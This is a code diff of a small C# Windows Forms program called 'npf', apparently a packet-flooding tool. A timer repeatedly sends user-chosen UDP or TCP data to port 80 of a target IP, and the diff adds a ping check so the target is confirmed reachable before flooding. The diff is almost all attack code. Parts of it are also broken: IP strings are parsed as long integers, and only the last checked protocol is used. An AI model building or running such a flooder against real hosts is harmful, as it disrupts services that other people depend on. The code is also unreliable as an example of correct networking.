@@ -90,61 +90,84 @@ namespace npf
 
         private void floodTimer_Tick(object sender, EventArgs e)
         {
-            foreach (int s in ProtocolBox.CheckedIndices) // this checks which boxes were checked
+            if (ProtocolBox.CheckedItems.Count != 0)
             {
-                int checkthings = Int16.Parse(s.ToString());
-                if (checkthings == 0)
+                //looped through all checked items and show results.
+                string s = "";
+                for (int x = 0; x < ProtocolBox.CheckedItems.Count; x++)
                 {
-                    floodTcp();
+                    s = ProtocolBox.CheckedItems[x].ToString();
                 }
-                else if (checkthings == 1)
+                if (s == "UDP")
                 {
                     floodUdp();
                 }
+                else if (s == "TCP")
+                {
+                    floodTcp();
+                }
                 else
                 {
-                    MessageBox.Show("Please check you checked a box. Checking 0 or both will not work.");
+                    MessageBox.Show("Please make sure you checked at least 1 box.");
+                    floodTimer.Stop();
                 }
             }
         }
         private void floodUdp() // all the upcoming code happens every second or so
         {
-            UdpClient client = new UdpClient(); // this is just the udp client, nothing interesting
             string ipaddr = IPText.Text;
-            try
+            var checkedudp = CheckIP(ipaddr);
+            UdpClient client = new UdpClient(); // this is just the udp client, nothing interesting
+            if (checkedudp)
             {
-                client.Connect(ipaddr, 80); // this is where the fun starts 
-                byte[] sendBytes = Encoding.ASCII.GetBytes(DataText.Text);
-                client.Send(sendBytes, sendBytes.Length); // this actually sends the packet
-                client.AllowNatTraversal(true);
-                client.DontFragment = true;
+                try
+                {
+                    client.Connect(ipaddr, 80); // this is where the fun starts 
+                    byte[] sendBytes = Encoding.ASCII.GetBytes(DataText.Text);
+                    client.Send(sendBytes, sendBytes.Length); // this actually sends the packet
+                    client.AllowNatTraversal(true);
+                    client.DontFragment = true;
+                }
+                catch
+                {
+                    const string errorMessage = "There was an error with npf.";
+                    const string errorCaption = "Ensure that you have an internet connection and that all the data is entered correctly.";
+                    MessageBox.Show(errorMessage, errorCaption,
+                        MessageBoxButtons.OK);
+                    floodTimer.Stop();
+                }
             }
-            catch
+            else
             {
-                const string errorMessage = "There was an error with npf.";
-                const string errorCaption = "Ensure that you have an internet connection and that all the data is entered correctly.";
-                MessageBox.Show(errorMessage, errorCaption,
-                    MessageBoxButtons.OK);
+                MessageBox.Show("The IP address is invalid or cannot be pinged at this time. Please enter a valid IP address");
                 floodTimer.Stop();
             }
         }
         
-        private bool CheckTcpIP()
+        public static bool CheckIP(string nameOrAddress) // this pings the ip to make sure it is correct
         {
-            string ipaddr = IPText.Text;
-            long ipaddrtcp = long.Parse(ipaddr);
-            string localhost = GetLocalIPAddress();
-            long localhosttcp = long.Parse(localhost);
-            Ping ping = new Ping();
-            PingReply pingreslut = ping.Send(ipaddr);
-            if (pingreslut.Status.ToString() == "Success")
+            bool pingable = false;
+            Ping pinger = null;
+
+            try
             {
-                return true;
+                pinger = new Ping();
+                PingReply reply = pinger.Send(nameOrAddress);
+                pingable = reply.Status == IPStatus.Success;
             }
-            else
+            catch (PingException)
             {
-                return false;
+                // Discard PingExceptions and return false;
             }
+            finally
+            {
+                if (pinger != null)
+                {
+                    pinger.Dispose();
+                }
+            }
+
+            return pingable;
         }
 
         private void floodTcp() // just floodudp but for tcp
@@ -153,7 +176,7 @@ namespace npf
             long ipaddrtcp = long.Parse(ipaddr);
             string localhost = GetLocalIPAddress();
             long localhosttcp = long.Parse(localhost);
-            var checkip = CheckTcpIP();
+            var checkip = CheckIP(ipaddr);
             TcpClient client = new TcpClient(); // this is just the tcp client, nothing interesting
             if (checkip)
             {
@@ -176,7 +199,7 @@ namespace npf
             }
             else
             {
-                MessageBox.Show("IP Address invalid, please make sure it is valid.");
+                MessageBox.Show("The IP address is invalid or cannot be pinged at this time. Please enter a valid IP address");
                 floodTimer.Stop();
             }
         }
